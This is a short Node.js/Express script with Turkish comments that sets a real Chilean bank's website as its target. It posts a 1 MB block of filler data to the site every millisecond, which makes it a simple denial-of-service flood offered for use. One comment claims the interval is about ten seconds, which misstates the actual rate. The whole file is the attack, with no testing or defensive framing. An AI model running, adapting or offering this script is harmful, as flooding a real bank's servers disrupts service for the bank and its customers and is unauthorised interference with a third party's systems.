import express from 'express';
import axios from 'axios';
import fs from 'fs';

const app = express();
const port = 3001;

app.use(express.json());

const backendURL = 'https://www.bancofalabella.cl'; // Sunucu adresini buraya girin

function sendLargeData() {
  const data = generateLargeData(); // 1 MB boyutunda veri oluşturulması gerekiyor
  
  axios.post(backendURL, data, {
      headers: {
        'Content-Type': 'application/octet-stream', // Verinin türünü belirtin (örneğin, bu örnekte binary olarak belirtildi)
      },
    })
    .then(response => {
      console.log('Veri başarıyla gönderildi:', response.data);
    })
    .catch(error => {
      console.error('Veri gönderme hatası:', error);
    });
}

function generateLargeData() {
  // Örnek olarak 1 MB boyutunda rastgele veri oluşturma
  const fileSizeInBytes = 1024 * 1024; // 1 MB
  const data = Buffer.alloc(fileSizeInBytes, 'a'); // 1 MB boyutunda 'a' karakterleri içeren bir veri oluşturur
  return data;
}

const sendInterval = setInterval(sendLargeData, 1); // Belirli aralıklarla veri göndermek için bir zamanlayıcı oluşturuldu (örneğin, her 10 saniyede bir)

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`);
});
